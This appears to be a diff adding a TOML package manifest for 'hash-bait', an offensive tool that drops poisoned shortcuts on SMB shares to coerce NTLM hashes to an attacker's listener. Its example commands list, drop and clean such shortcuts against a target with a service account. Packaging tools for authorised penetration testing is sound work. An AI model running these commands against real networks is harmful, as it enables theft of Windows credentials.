@@ -1,0 +1,17 @@
+schema = 1
+kind = "kali"
+description = "Drop poisoned shortcuts on SMB shares to coerce NTLM hashes"
+tags = ["ad", "smb", "ntlm", "coerce", "responder"]
+upstream = "https://github.com/Real-Fruit-Snacks/hash-bait"
+licence = "MIT"
+arch = "x86_64"
+examples = [
+  "hash-bait list -t {ip} -u svc-reader",
+  "hash-bait drop -t {ip} -c {lhost} -s public -u svc-reader -i eth0",
+  "hash-bait clean -t {ip} -s public -u svc-reader",
+]
+
+[[command]]
+name = "hash-bait"
+type = "binary"
+path = "files/hash-bait"
